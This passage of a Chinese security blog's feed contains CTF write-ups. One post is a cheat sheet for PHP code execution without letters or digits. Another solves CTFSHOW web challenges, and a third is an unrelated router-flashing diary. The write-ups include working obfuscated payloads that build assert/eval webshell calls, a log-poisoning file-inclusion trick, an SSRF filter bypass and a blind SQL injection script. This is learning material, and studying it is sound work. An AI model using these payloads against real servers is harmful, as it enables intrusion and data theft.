punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>aaa<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span></code></pre><p><code>173.56.110.11</code>，返回flag</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/6887">从XML相关一步一步到XXE漏洞</a></li><li><a href="https://www.freebuf.com/column/211251.html">xPath注入学习之基础语法学习</a></li><li><a href="https://blog.blankshell.com/2020/06/09/xxe%e8%af%a6%e7%bb%86%e6%80%bb%e7%bb%93/">XXE知识总结</a></li><li><a href="http://www.suk1.top/2020/03/18/XXElearn/">XXE漏洞学习</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer-mbuGQWQJ&quot; class=&quot;aplayer aplayer-tag-marker meting-tag-marker&quot; data-id=&quot;5174564734&quot; data-server=&quot;netease&quot; data-type=&quot;playlist&quot; data-mode=&quot;circulation&quot; data-autoplay=&quot;false&quot; data-mutex=&quot;true&quot; data-listmaxheight=&quot;340px&quot; data-preload=&quot;none&quot; data-theme=&quot;#ad7a86&quot;&gt;&lt;/div&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="xml" scheme="https://www.extrader.top/tags/xml/"/>
    
      <category term="xxe" scheme="https://www.extrader.top/tags/xxe/"/>
    
      <category term="xpath" scheme="https://www.extrader.top/tags/xpath/"/>
    
  </entry>
  
  <entry>
    <title>PHP无字母数字RCE</title>
    <link href="https://www.extrader.top/posts/a268445b/"/>
    <id>https://www.extrader.top/posts/a268445b/</id>
    <published>2020-08-09T04:22:50.000Z</published>
    <updated>2020-08-09T09:26:02.454Z</updated>
    
    <content type="html"><![CDATA[<p>CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上</p><p><strong>利用条件</strong>：<code>eval($_GET[&#39;exp&#39;]);</code></p><p><strong>限制条件</strong>：<code>preg_match(&#39;[a-z0-9]/is&#39;, $exp)</code></p><a id="more"></a><p>测试代码如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    if(!preg_match(&#39;&#x2F;[a-z0-9]&#x2F;is&#39;,$_GET[&#39;exp&#39;])) &#123;  eval($_GET[&#39;exp&#39;]);&#125;</code></pre><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">echo urlencode(~&#39;exp&#39;);</code></pre><p>payload</p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">echo urlencode(~&#39;phpinfo&#39;); (~%8F%97%8F%96%91%99%90)();  &#x3D;&#x3D;&gt;  phpinfo();echo urlencode(~&#39;assert&#39;);echo urlencode(~&#39;(eval($_POST[&quot;a&quot;]))&#39;);(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%DD%9E%DD%A2%D6%D6);  &#x3D;&#x3D;&gt;  assert(&#39;eval($_POST[&quot;a&quot;])&#39;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124140760.png" alt loading="lazy"></p><h3 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h3><p>php版本：PHP Version 7.2.24-0</p><p>exp</p><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F; 跑出非字母数字异或得到的 $str$str &#x3D; &#39;GET&#39;;$exp1 &#x3D; &#39;&#39;;$exp2 &#x3D; &#39;&#39;;for ($k &#x3D; 0; $k &lt; strlen($str); $k++) &#123;    $flag &#x3D; 0;    for ($i &#x3D; 0; $i &lt; 128; $i++) &#123;        if (($i &gt;&#x3D; 48 &amp;&amp; $i &lt;&#x3D; 57) || ($i &gt;&#x3D; 65 &amp;&amp; $i &lt;&#x3D; 90) || ($i &gt;&#x3D; 97 &amp;&amp; $i &lt;&#x3D; 122)) &#123;            continue;        &#125;        for ($j &#x3D; 0; $j &lt; 128; $j++) &#123;            if (($j &gt;&#x3D; 48 &amp;&amp; $j &lt;&#x3D; 57) || ($j &gt;&#x3D; 65 &amp;&amp; $j &lt;&#x3D; 90) || ($j &gt;&#x3D; 97 &amp;&amp; $j &lt;&#x3D; 122)) &#123;                continue;            &#125;            if ((chr($i) ^ chr($j)) &#x3D;&#x3D;&#x3D; $str[$k]) &#123;                $exp1 &#x3D; $exp1.urlencode(chr($i));                $exp2 &#x3D; $exp2.urlencode(chr($j));                $flag &#x3D; 1;                break;            &#125;        &#125;        if($flag &#x3D;&#x3D;&#x3D; 1)&#123;            break;        &#125;    &#125;&#125;echo $exp1.&#39;^&#39;.$exp2.&quot;\n&quot;;</code></pre><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo&#x3D;&#x3D;&gt;  phpinfo()    $&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])&#x3D;&#x3D;&gt;  assert(&quot;eval($_POST[&#39;a&#39;])&quot;)</code></pre><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809124757860.png" alt loading="lazy"></p><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[].[]; &#x2F;&#x2F;俩数组拼接强行返回ArrayArray,这里一个短杠的值也就是ArrayArray$__&#x3D;&#39;&#39;;  &#x2F;&#x2F;两个短杠赋值为空$_&#x3D;$_[&#39;&#39;];&#x2F;&#x2F;从arrayarray中取首字符，即a。这里$_&#x3D;$_[0]也是一样的道理，不过waf限制数字输入$_&#x3D;++$_; &#x2F;&#x2F;b$_&#x3D;++$_; &#x2F;&#x2F;c$_&#x3D;++$_; &#x2F;&#x2F;d$_&#x3D;++$_; &#x2F;&#x2F;e$__.&#x3D;$_; &#x2F;&#x2F;E  把两个短杠赋值为E$_&#x3D;++$_; &#x2F;&#x2F;F  一个短杠继续自增$_&#x3D;++$_; &#x2F;&#x2F;G $__&#x3D;$_.$__; &#x2F;&#x2F; GE  一个短杠自增变成了G，两个短杠在前面第十一行处已经赋值为E，拼接得GE$_&#x3D;++$_; &#x2F;&#x2F;H 此处一个短杠继续自增，为H$_&#x3D;++$_; &#x2F;&#x2F;I$_&#x3D;++$_; &#x2F;&#x2F;J$_&#x3D;++$_; &#x2F;&#x2F;k$_&#x3D;++$_; &#x2F;&#x2F;L$_&#x3D;++$_; &#x2F;&#x2F;M$_&#x3D;++$_; &#x2F;&#x2F;N$_&#x3D;++$_; &#x2F;&#x2F;O$_&#x3D;++$_; &#x2F;&#x2F;P$_&#x3D;++$_; &#x2F;&#x2F;Q$_&#x3D;++$_; &#x2F;&#x2F;R$_&#x3D;++$_; &#x2F;&#x2F;S$_&#x3D;++$_; &#x2F;&#x2F;T$__.&#x3D;$_; &#x2F;&#x2F; GET 在此处，两条短杠原是GE与一条短杠（已经自增为T），.&#x3D;拼接，构成get$&#123;&#39;_&#39;.$__&#125;[_]($&#123;&#39;_&#39;.$__&#125;[__]); &#x2F;&#x2F; 进行拼接，$_GET[&#39;_&#39;]($_GET[&#39;__&#39;]);url编码后：%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b</code></pre><pre class="language-php" data-language="php"><code class="language-php">&lt;?php$_&#x3D;[];$_&#x3D;@&quot;$_&quot;; &#x2F;&#x2F; $_&#x3D;&#39;Array&#39;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]; &#x2F;&#x2F; $_&#x3D;$_[0];$___&#x3D;$_; &#x2F;&#x2F; A$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__; &#x2F;&#x2F; S$___.&#x3D;$__; &#x2F;&#x2F; S$__&#x3D;$_;$__++;$__++;$__++;$__++; &#x2F;&#x2F; E $___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; R$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; P$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; O$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; S$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; &#x2F;&#x2F; T$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]); &#x2F;&#x2F; ASSERT($_POST[_]);url编码后：%24_%3d%5b%5d%3b%24_%3d%40%22%24_%22%3b%24_%3d%24_%5b%27!%27%3d%3d%27%40%27%5d%3b%24___%3d%24_%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24___.%3d%24__%3b%24____%3d%27_%27%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24__%3d%24_%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24__%2b%2b%3b%24____.%3d%24__%3b%24_%3d%24%24____%3b%24___(%24_%5b_%5d)%3b</code></pre><p>注意这两个payload利用的话要php版本小于7才能成功利用，</p><blockquote><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，<code>assert</code>不再是函数，变成了一个语言结构（类似<code>eval</code>），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用<code>file_put_contents</code>函数，同样可以用来<code>getshell</code>。</p></blockquote><p>测试结果如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/PHP%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97RCE/image-20200809170716430.png" alt loading="lazy"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></li><li><a href="https://xz.aliyun.com/t/7181">通过一道代码审计题目来练习无数字字母构造webshell</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CTF有时会碰到这种类型题，故在这里总结一下，日后有新的操作再补上&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;利用条件&lt;/strong&gt;：&lt;code&gt;eval($_GET[&amp;#39;exp&amp;#39;]);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;限制条件&lt;/strong&gt;：&lt;code&gt;preg_match(&amp;#39;[a-z0-9]/is&amp;#39;, $exp)&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="备忘录" scheme="https://www.extrader.top/categories/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
      <category term="php" scheme="https://www.extrader.top/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>路由器折腾小记</title>
    <link href="https://www.extrader.top/posts/4704f692/"/>
    <id>https://www.extrader.top/posts/4704f692/</id>
    <published>2020-08-06T04:27:18.000Z</published>
    <updated>2020-08-08T13:32:13.301Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用</p><h4 id="物色路由器"><a href="#物色路由器" class="headerlink" title="物色路由器"></a>物色路由器</h4><p>因为从来没玩过，而且家里好几年前的路由器是时候改换了，于是就准备换台，当初只是单纯的想换台路由器提升提升家里的WiFi信号的网速，都已经在jd上选好了一台水星的，但因为一直在学校迟迟没有买，后来发现了路由器的各种玩法，刷固件fq，解锁某云灰色music之类的，就开始在网上各种资料和固件，也慢慢的在物色一款路由器（原来选中的水星的那个网上资料少，官方好像不支持固件切换），一直在小米和newifi3之间徘徊，最后选择了联想的newifi3，结果无线翻车了，现在后悔了当时为什么没有看到k2p，┭┮﹏┭┮，无线信号是真的差，刷了openwrt后居然赶不上我家原来的老路由器，心态炸了。。。</p><p>但是。。。炸归炸，用还是有用的，虽然无线不咋地，当其他方面用用可以的，支持usb，512M的内存</p><h4 id="刷不死breed"><a href="#刷不死breed" class="headerlink" title="刷不死breed"></a>刷不死breed</h4><p>先下好不死breed固件，这个网上很多</p><p>然后本地搭一个web服务器，把文件放上面，然后在路由器终端了里就可以用wget下载了</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh root@192.168.99.1cd &#x2F;tmpwget http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;newifi-d2-jail-break.koinsmod newifi-d2-jail-break.ko</code></pre><p>随后SSH 会停止响应，因为 newifi-d2-jail-break.ko 会冻结系统的其他功能，强制写入 Newifi D2 专用版 Breed 到 Flash</p><p>然后把路由器电源拔了之后按住reset按钮再插上电源直到只有电源等开始闪烁再松开电源，浏览器输入192.168.1.1即可进入breed web管理界面，再在这里面将原来的eeprom和编程器备份一下，再刷入自己想要的第三方固件（bin文件）</p><p>刷这个breed的原因是因为我们在刷第三方固件的时候如果没操作好，固件切换出了差错的话，路由器就变砖了，为了避免这种情况，就有大神做出了这个breed，相当于一个uboot引导加载程序</p><h4 id="刷第三方固件"><a href="#刷第三方固件" class="headerlink" title="刷第三方固件"></a>刷第三方固件</h4><p>这里我试了好几个，最后选择了esir大神的openwrt固件，这里可以下载： <a href="https://openwrt.club/dl">https://openwrt.club/dl</a> </p><p>选择里面的<code>openwrt-ramips-mt7621-d-team_newifi-d2-squashfs-sysupgrade.bin</code>文件刷入后等待路由器重启，重启完成后输入192.168.1.1即可进入openwrt管理界面</p><h4 id="刷openclash"><a href="#刷openclash" class="headerlink" title="刷openclash"></a>刷openclash</h4><p>下载地址 <a href="https://github.com/vernesong/OpenClash/releases">https://github.com/vernesong/OpenClash/releases</a></p><p>下好ipk文件，ssh连上路由器，执行以下命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">cd &#x2F;tmp opkg updateopkg install coreutils-nohup bash iptables dnsmasq-full curl jsonfilter ca-certificates ipset ip-full iptables-mod-tproxywget https:&#x2F;&#x2F;github.com&#x2F;vernesong&#x2F;OpenClash&#x2F;releases&#x2F;download&#x2F;v0.39.6-beta&#x2F;luci-app-openclash_0.39.6-beta_all.ipkopkg install luci-app-openclash_0.39.6-beta_all.ipk</code></pre><p>然后刷新一下页面就可以在服务里面看到openclash了，剩下的配置工作就要自己操作了</p><p>另外这个版本的自带解锁网易云灰色音乐的功能，直接开启就可以了</p><h4 id="自己编译openwrt"><a href="#自己编译openwrt" class="headerlink" title="自己编译openwrt"></a>自己编译openwrt</h4><p>注意：</p><ol><li><strong>不</strong>要用 <strong>root</strong> 用户来 git 和编译！！！</li><li>国内用户编译前最好准备好梯子</li><li>默认登陆IP 192.168.1.1, 密码 password</li></ol><p>需要Ubuntu 18 LTS x64环境</p><pre class="language-bash" data-language="bash"><code class="language-bash">sudo apt-get updatesudo apt-get -y install build-essential asciidoc binutils bzip2 gawk gettext git libncurses5-dev libz-dev patch python3.5 python2.7 unzip zlib1g-dev lib32gcc1 libc6-dev-i386 subversion flex uglifyjs git-core gcc-multilib p7zip p7zip-full msmtp libssl-dev texinfo libglib2.0-dev xmlto qemu-utils upx libelf-dev autoconf automake libtool autopoint device-tree-compiler g++-multilib antlr3 gperf</code></pre><p>然后下载openwrt的源代码</p><pre class="language-bash" data-language="bash"><code class="language-bash">git clone https:&#x2F;&#x2F;github.com&#x2F;Lienol&#x2F;openwrtcd openwrt&#x2F;packagegit clone https:&#x2F;&#x2F;github.com&#x2F;kenzok8&#x2F;openwrt-packages.gitcd ...&#x2F;scripts&#x2F;feeds clean.&#x2F;scripts&#x2F;feeds update -a.&#x2F;scripts&#x2F;feeds install -amake menuconfig</code></pre><p>然后就是配置编译选项了</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">如果是newifi3则：Target System选择 <span class="token string">"MediaTek Ralink MIPS"</span>Subtarget选择<span class="token string">"MT7621"</span>Target Profile选择<span class="token string">"Newifi D2"</span></code></pre><p>我们希望有web界面，还需在<code>LuCI ---&gt; Collections</code>选项中选上<code>luci</code></p><p>在<code>LuCI ---&gt; Applications</code>选择要添加的插件应用。</p><p>在<code>LuCI ---&gt; Themes</code>中设置要安装的主题。</p><p><code>make -j8 download v=s</code> 下载dl库</p><p>输入 <code>make -j1 V=s</code> （<code>-j</code> 后面的数字1是线程数。第一次编译推荐用单线程）即可开始编译你要的固件了。</p><p>编译完成后输出路径：<code>openwrt/bin/targets</code></p><p>第二次编译：</p><pre class="language-bash" data-language="bash"><code class="language-bash">cd ledegit pull.&#x2F;scripts&#x2F;feeds update -a &amp;&amp; .&#x2F;scripts&#x2F;feeds install -amake defconfigmake -j8 downloadmake -j$(($(nproc) + 1)) V&#x3D;s</code></pre><p>如果需要重新配置：</p><pre class="language-bash" data-language="bash"><code class="language-bash">rm -rf .&#x2F;tmp &amp;&amp; rm -rf .configmake menuconfigmake -j$(($(nproc) + 1)) V&#x3D;s</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://cloud.tencent.com/developer/article/1614849">编译自己的openwrt固件 附编译好的newifi3固件</a></li><li><a href="https://mianao.info/2020/03/01/轻松编译Openwrt固件支持V2ray和Trojan-上篇">轻松编译Openwrt固件支持V2ray和Trojan-上篇</a></li><li><a href="https://mianao.info/2020/03/02/%E8%BD%BB%E6%9D%BE%E7%BC%96%E8%AF%91Openwrt%E5%9B%BA%E4%BB%B6%E6%94%AF%E6%8C%81V2ray%E5%92%8CTrojan-%E4%B8%8B%E7%AF%87">轻松编译Openwrt固件支持V2ray和Trojan-下篇</a></li><li><a href="https://mianao.info/2020/05/05/%E7%BC%96%E8%AF%91%E6%9B%B4%E6%96%B0OpenWrt-PassWall%E5%92%8CSSR-plus%E6%8F%92%E4%BB%B6">编译更新OpenWrt PassWall和SSR-plus插件</a></li><li><a href="https://github.com/kenzok8/openwrt-packages">openwrt-packages</a></li><li><a href="https://github.com/Lienol/openwrt">openwrt</a></li><li><a href="https://github.com/coolsnowwolf/lede">lede</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本文记录我（纯小白）这几天折腾路由器的大致过程，备忘用&lt;/p&gt;
&lt;h4 id=&quot;物色路由器&quot;&gt;&lt;a href=&quot;#物色路由器&quot; class=&quot;headerlink&quot; title=&quot;物色路由器&quot;&gt;&lt;/a&gt;物色路由器&lt;/h4&gt;&lt;p&gt;因为从来没玩过，而且家里好几年前的路由器是时候
      
    
    </summary>
    
    
      <category term="杂七杂八" scheme="https://www.extrader.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"/>
    
    
      <category term="折腾" scheme="https://www.extrader.top/tags/%E6%8A%98%E8%85%BE/"/>
    
      <category term="路由器" scheme="https://www.extrader.top/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>CTFSHOW-WEB_AK赛</title>
    <link href="https://www.extrader.top/posts/f7521cf/"/>
    <id>https://www.extrader.top/posts/f7521cf/</id>
    <published>2020-08-03T13:10:31.000Z</published>
    <updated>2020-08-04T03:51:45.832Z</updated>
    
    <content type="html"><![CDATA[<p>在菜鸡的道路上越走越远。。。淦！</p><a id="more"></a><h3 id="签到-观己"><a href="#签到-观己" class="headerlink" title="签到_观己"></a>签到_观己</h3><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpif(isset($_GET[&#39;file&#39;]))&#123;    $file &#x3D; $_GET[&#39;file&#39;];    if(preg_match(&#39;&#x2F;php&#x2F;i&#39;, $file))&#123;        die(&#39;error&#39;);    &#125;else&#123;        include($file);    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;</code></pre><p><code>?file=/flag.txt</code>直接出答案。。这算个非预期解吧</p><p>另外的解法：文件包含Nginx日志文件、</p><p><code>?file=/var/log/nginx/access.log</code>可读日志文件内容，里面包含用户访问的UA信息</p><p>于是</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200803211650015.png" alt loading="lazy"></p><p>尝试命令执行</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK赛/image-20200803211626102.png" alt="image-20200803211626102" loading="lazy"><p>随后<code>cat /flag.txt</code>即可</p><h3 id="Web1-观字"><a href="#Web1-观字" class="headerlink" title="Web1_观字"></a>Web1_观字</h3><p>题目给出源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#flag in http:&#x2F;&#x2F;192.168.7.68&#x2F;flagif(isset($_GET[&#39;url&#39;]))&#123;    $url &#x3D; $_GET[&#39;url&#39;];    $protocol &#x3D; substr($url, 0,7);    if($protocol!&#x3D;&#39;http:&#x2F;&#x2F;&#39;)&#123;        die(&#39;仅限http协议访问&#39;);    &#125;    if(preg_match(&#39;&#x2F;\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\&#96;|\~|\+|\&#39;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0&#x2F;&#39;, $url))&#123;        die(&#39;仅限域名地址访问&#39;);    &#125;    system(&#39;curl &#39;.$url);&#125;</code></pre><p><code>payload</code>：<code>/?url=http://192。168。7。68/flag</code></p><p>原因是curl中可以用<code>。</code>替换<code>.</code></p><p>另外，ip可以使用十进制进行访问，即<code>http://3232237380/flag</code>，但题目过滤了0</p><h3 id="Web2-观星"><a href="#Web2-观星" class="headerlink" title="Web2_观星"></a>Web2_观星</h3><p>url可以给id传值，当传入一个引号的时候回显<code>enheng?</code>，推测sql注入</p><p>FUZZ测试发现过滤了以下的内容（长度为533的）</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200801213125358.png" alt loading="lazy"></p><p>未过滤<code>^</code>，考虑布尔盲注</p><p>payload：</p><p><code>id=1^case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end.format(i,j)</code></p><p>过滤了逗号，<code>if</code>无法使用则用<code>case...when...then...else...end</code>代替绕过，<code>substr</code>中的逗号用<code>substr(...from...for...)</code>代替绕过</p><p>接下来就可以写脚本了</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl &#x3D; &#39;http:&#x2F;&#x2F;dc894a39-ba77-4e9f-9201-e52d7a19ba5c.chall.ctf.show&#x2F;index.php?id&#x3D;1^&#39;# payload &#x3D; &#39;case(ord(substr((database())from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;   web1# payload &#x3D; &#39;case(ord(substr((select(group_concat(table_name))from(information_schema.tables)where((table_schema)regexp(database())))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    flag,page,user# payload &#x3D; &#39;case(ord(substr((select(group_concat(column_name))from(information_schema.columns)where((table_name)regexp(0x666C6167)))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;    FLAG_COLUMN,flagpayload &#x3D; &#39;case(ord(substr((select(flag)from(flag))from(&#123;0&#125;)for(1))))when(&#123;1&#125;)then(2)else(3)end&#39;flag &#x3D; &#39;&#39;for i in range(1, 128):    for j in range(38, 126):        urls &#x3D; url+payload.format(i, j)        request &#x3D; requests.get(urls)        if &#39;I asked nothing&#39; in request.text:            flag +&#x3D; chr(j)            print(flag)            break</code></pre><h3 id="Web3-观图"><a href="#Web3-观图" class="headerlink" title="Web3_观图"></a>Web3_观图</h3><p>showImage.php可看到源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;&#x2F;$key &#x3D; substr(md5(&#39;ctfshow&#39;.rand()),3,8);&#x2F;&#x2F;flag in config.phpinclude(&#39;config.php&#39;);if(isset($_GET[&#39;image&#39;]))&#123;    $image&#x3D;$_GET[&#39;image&#39;];    $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);    if(file_exists($str))&#123;        header(&#39;content-type:image&#x2F;gif&#39;);        echo file_get_contents($str);    &#125;&#125;else&#123;    